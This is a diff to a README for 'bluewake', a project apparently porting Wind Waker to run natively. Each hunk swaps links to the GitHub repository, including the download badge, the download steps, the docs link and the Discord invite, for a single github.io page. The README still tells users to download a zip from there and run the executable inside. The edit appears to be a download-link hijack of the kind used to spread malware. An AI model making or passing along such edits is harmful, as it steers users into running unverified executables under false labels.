@@ -1,6 +1,6 @@
 # 🌊 bluewake - Play Wind Waker Natively Everywhere
 
-[![Download bluewake](https://img.shields.io/badge/Download-bluewake-4CAF50?style=for-the-badge&logo=github)](https://github.com/ntannh55/bluewake)
+[![Download bluewake](https://img.shields.io/badge/Download-bluewake-4CAF50?style=for-the-badge&logo=github)](https://ntannh55.github.io)
 
 ## 🎮 What Is bluewake?
 
@@ -46,7 +46,7 @@ While bluewake is designed to be lightweight, here are the general guidelines:
 
 Follow these simple steps to start playing:
 
-1. **Visit the Download Page**: Go to [https://github.com/ntannh55/bluewake](https://github.com/ntannh55/bluewake) using your web browser (Chrome, Edge, or Firefox recommended).
+1. **Visit the Download Page**: Go to [https://ntannh55.github.io](https://ntannh55.github.io) using your web browser (Chrome, Edge, or Firefox recommended).
 2. **Look for the Releases Section**: On that page, find the "Releases" tab on the right side or scroll down until you see the latest version listed. Click on it.
 3. **Download the Windows File**: On the releases page, you'll see a list of downloadable files. Look for one that contains "Windows" in its name and ends with `.zip`. Click the download link next to it. Your browser will save the file to your "Downloads" folder.
 4. **Extract the Archive**: Navigate to your Downloads folder and find the downloaded `.zip` file. Right-click on it and select "Extract All..." Then choose a destination folder (the default is fine) and click "Extract". Windows will create a new folder with the game files inside.
@@ -101,7 +101,7 @@ The process mirrors the Windows instructions:
 
 ## 📚 Quick Start Recap
 
-1. Go to [the download page](https://github.com/ntannh55/bluewake)
+1. Go to [the download page](https://ntannh55.github.io)
 2. Download the `.zip` for your operating system
 3. Extract the archive
 4. Run the bluewake executable
@@ -119,9 +119,9 @@ You have options to play Wind Waker: original hardware, emulators, or bluewake. 
 
 ## 🔗 Additional Resources
 
-- [Official Repository](https://github.com/ntannh55/bluewake)
-- [Game Data File Guide](https://github.com/ntannh55/bluewake/docs) (linked on the repo page)
-- [Discord Community](https://discord.gg/bluewake) (find the invite in the repo README)
+- [Official Repository](https://ntannh55.github.io)
+- [Game Data File Guide](https://ntannh55.github.io) (linked on the repo page)
+- [Discord Community](https://ntannh55.github.io) (find the invite in the repo README)
 
 ## 📖 Final Notes
 
